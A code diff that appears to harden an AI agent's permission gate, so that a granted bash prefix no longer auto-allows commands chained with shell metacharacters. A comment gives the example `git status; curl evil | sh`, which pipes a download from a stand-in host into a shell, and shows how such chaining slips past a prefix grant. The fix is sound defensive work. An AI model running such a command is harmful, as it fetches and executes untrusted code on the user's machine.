@@ -20,6 +20,17 @@ export function bashPrefixOf(command: string): string {
   return tokens.slice(0, 2).join(" ");
 }
 
+// Shell metacharacters that can chain/expand a command past the granted prefix.
+// A prefix grant must NOT silently auto-allow `git status; curl evil | sh`.
+const SHELL_META = /[;&|`$(){}<>\\!*?#\n\r]|\$\(|<\(/;
+
+/** A granted prefix only auto-allows a command that is the prefix + plain args (no metachars). */
+export function prefixGrantCovers(prefix: string, command: string): boolean {
+  if (command !== prefix && !command.startsWith(prefix + " ")) return false;
+  const rest = command.slice(prefix.length);
+  return !SHELL_META.test(rest);
+}
+
 function summarize(tool: ToolDef<any>, input: Record<string, unknown>): string {
   if (tool.name === "bash") return String(input.command ?? "");
   if (typeof input.path === "string") return input.path;
@@ -43,7 +54,7 @@ export class PermissionGate {
 
     const isBash = tool.name === "bash";
     const command = isBash ? String(input.command ?? "") : "";
-    if (isBash && this.bashPrefixes.some((p) => command === p || command.startsWith(p + " "))) {
+    if (isBash && this.bashPrefixes.some((p) => prefixGrantCovers(p, command))) {
       return { behavior: "allow", reason: "session-prefix-grant" };
     }
 
